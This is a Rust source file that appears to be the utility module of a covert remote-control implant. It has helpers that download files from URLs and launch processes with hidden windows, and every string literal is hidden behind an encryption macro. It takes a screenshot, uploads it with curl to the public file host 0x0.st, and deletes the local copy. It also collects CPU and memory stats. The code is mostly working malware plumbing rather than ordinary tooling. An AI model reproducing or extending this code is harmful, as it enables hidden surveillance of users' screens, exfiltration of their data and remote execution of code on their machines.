#![allow(dead_code)]
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use std::{
    fs,
    fs::File,
    io,
    io::Cursor,
    path::Path,
    process::{Command, Output, Child},
    thread,
    time::Duration,
};

use anyhow::{anyhow, Context};
use rand::prelude::*;
use screenshots::Screen;
use systemstat::{saturating_sub_bytes, Platform, System};

use crate::{crypto, info_crypt, utils};

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;
#[cfg(target_os = "windows")]
const DETACHED_PROCESS: u32 = 0x00000008;

pub async fn download_string(url: &str) -> reqwest::Result<String> {
    reqwest::get(url).await?.text().await
}
pub async fn download_data(url: &str) -> anyhow::Result<Vec<u8>> {
    Ok(reqwest::get(url).await?.bytes().await?.to_vec())
}
pub async fn download_from_url(url: &str, path: &str) -> anyhow::Result<()> {
    let resp = reqwest::get(url).await?;

    let mut out = File::create(path)?;
    let mut content = Cursor::new(resp.bytes().await?);

    io::copy(&mut content, &mut out)?;

    Ok(())
}

fn create_command(exe: &str, args: Vec<&str>,wait: bool) -> anyhow::Result<Command> {
    let mut full_command: Vec<String> = vec![];

    #[cfg(target_os = "windows")]
    {
        full_command.push(crypto!("cmd.exe"));
        full_command.push(crypto!("/c"));
        if !wait {
            full_command.push(crypto!("start"));
        }
    }

    full_command.push(exe.to_owned());
    for arg in args {
        full_command.push(arg.to_owned());
    }

    let mut command = Command::new(full_command[0].clone());
    command.args(full_command[1..full_command.len()].to_vec());

    #[cfg(target_os = "windows")]
    command.creation_flags(CREATE_NO_WINDOW);

    Ok(command)
}

pub fn run_process_handle(exe: &str, args: Vec<&str>) -> anyhow::Result<Child> {
    Ok(create_command(exe,args,false)?.spawn()?)
}

pub fn run_process_with_output_wait(exe: &str, args: Vec<&str>) -> anyhow::Result<Output> {
    Ok(create_command(exe,args,true)?.output()?)
}

pub fn run_process(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {

    let mut command = create_command(exe,args,wait)?;

    if wait {
        command.output()?;
    } else {
        command.spawn()?;
    }

    Ok(())
}

pub fn run_process_with_work_dir(
    exe: &str,
    args: Vec<&str>,
    wait: bool,
    current_dir: &str,
) -> anyhow::Result<()> {

    let mut command = create_command(exe,args,wait)?;
    command.current_dir(current_dir);

    if wait {
        command.output()?;
    } else {
        command.spawn()?;
    }
    Ok(())
}

pub fn get_working_dir() -> anyhow::Result<String> {
    #[cfg(not(target_os = "windows"))]
    {
        use std::env;

        let path = format!("{}/WorkDir", env::current_dir()?.display());
        if !Path::new(&path).exists() {
            fs::create_dir(&path)?;
        }

        Ok(path)
    }
    #[cfg(target_os = "windows")]
    {
        use platform_dirs::AppDirs;

        let app_dirs = AppDirs::new(Some("WPKG"), true)
            .context(crypto!("Failed to get WPKG app directory"))?;
        let config_dir = app_dirs.config_dir.display().to_string();

        if !Path::new(&config_dir).exists() {
            fs::create_dir(&config_dir)?;
        }

        Ok(config_dir)
    }
}

pub fn screenshot() -> anyhow::Result<String> {
    info_crypt!("Creating screenshot...");

    let screens = Screen::all().ok_or_else(|| anyhow!(crypto!("Failed to takie screenshot")))?;

    if screens.is_empty() {
        return Err(anyhow!(crypto!("Screen is empty")));
    }

    let image = screens
        .get(0)
        .context(crypto!("Could not find screens"))?
        .capture()
        .context(crypto!("Empty image"))?;
    let buffer = image.buffer();

    // Save the image.
    let mut rng = rand::thread_rng();
    let save_path = format!(
        "{work_dir}/{rand}{ext}",
        work_dir = get_working_dir()?,
        rand = rng.gen::<i32>(),
        ext = ".png",
    );

    fs::write(&save_path, &buffer)?;

    info_crypt!("Screenshot created!");

    Ok(save_path)
}

pub async fn screenshot_url() -> anyhow::Result<String> {
    let path = screenshot()?;

    info_crypt!("Uploading screenshot...");

    let out = utils::run_process_with_output_wait(
        &crypto!("curl"),
        vec![
            &crypto!("-F"),
            &format!("{}{}", crypto!("file=@"), path),
            &crypto!("https://0x0.st"),
        ],
    )?;

    tokio::spawn(async { fs::remove_file(path).unwrap() });

    Ok(String::from_utf8(out.stdout)?.replace('\n', ""))
}

pub fn stat() -> String {
    // get system status
    let sys = System::new();

    // init variables
    let mut cpu_usage = 0.;
    let mut memory_free = 0;
    let mut memory_total = 0;
    let mut swap_free = 0;
    let mut swap_total = 0;

    // get cpu usage
    if let Ok(cpu) = sys.cpu_load_aggregate() {
        thread::sleep(Duration::from_secs(1));
        let cpu = cpu.done().unwrap();
        cpu_usage = cpu.user * 100.0;
    }
    // get memory usage
    if let Ok(mem) = sys.memory() {
        memory_free = saturating_sub_bytes(mem.total, mem.free).as_u64();
        memory_total = mem.total.as_u64();
    }

    // get swap usage
    if let Ok(swap) = sys.swap() {
        swap_free = saturating_sub_bytes(swap.total, swap.free).as_u64();
        swap_total = swap.total.as_u64();
    }

    // return stats
    format!(
        "{} {} {} {} {}",
        cpu_usage, memory_free, memory_total, swap_free, swap_total
    )
}
